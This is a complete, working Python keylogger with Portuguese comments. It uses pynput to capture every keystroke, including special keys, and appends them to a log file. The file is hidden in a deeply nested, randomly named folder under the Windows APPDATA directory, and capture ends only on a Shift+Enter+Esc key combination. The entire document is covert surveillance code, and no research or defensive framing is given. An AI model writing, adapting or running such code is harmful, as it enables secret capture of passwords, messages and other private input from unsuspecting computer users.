import os
from pynput import keyboard

# Diretório onde o arquivo de log será armazenado
log_dir = os.path.join(os.getenv('APPDATA'), 'open', 'ext', 'limp', 'utk', 'tud', 'hhj')

# Verifica se o diretório existe, se não, cria-o
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Caminho completo do arquivo de log
log_file = os.path.join(log_dir, 'lex4452.txt')

# Dicionário para traduzir algumas teclas especiais
key_translations = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: " [BACKSPACE] ",
    keyboard.Key.shift: "",
    keyboard.Key.shift_r: "",
    keyboard.Key.ctrl_l: "",
    keyboard.Key.ctrl_r: "",
    keyboard.Key.alt_l: "",
    keyboard.Key.alt_r: "",
    keyboard.Key.caps_lock: " [CAPS_LOCK] ",
    keyboard.Key.esc: " [ESC] ",
}

# Variáveis para rastrear o estado das teclas
pressed_keys = set()

# Função para escrever no arquivo de log
def write_to_log(content):
    with open(log_file, "a") as f:
        f.write(content)

# Função que será chamada sempre que uma tecla for pressionada
def on_press(key):
    global pressed_keys
    pressed_keys.add(key)
    try:
        # Captura caracteres normais
        write_to_log(key.char)
    except AttributeError:
        # Captura teclas especiais
        if key in key_translations:
            write_to_log(key_translations[key])
        else:
            write_to_log(f" [{key}] ")

    # Verificar se Shift + Enter + Esc estão pressionadas
    if (keyboard.Key.shift in pressed_keys or keyboard.Key.shift_r in pressed_keys) and keyboard.Key.enter in pressed_keys and keyboard.Key.esc in pressed_keys:
        return False

# Função que será chamada sempre que uma tecla for solta
def on_release(key):
    global pressed_keys
    if key in pressed_keys:
        pressed_keys.remove(key)

# Configurar o listener do teclado
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()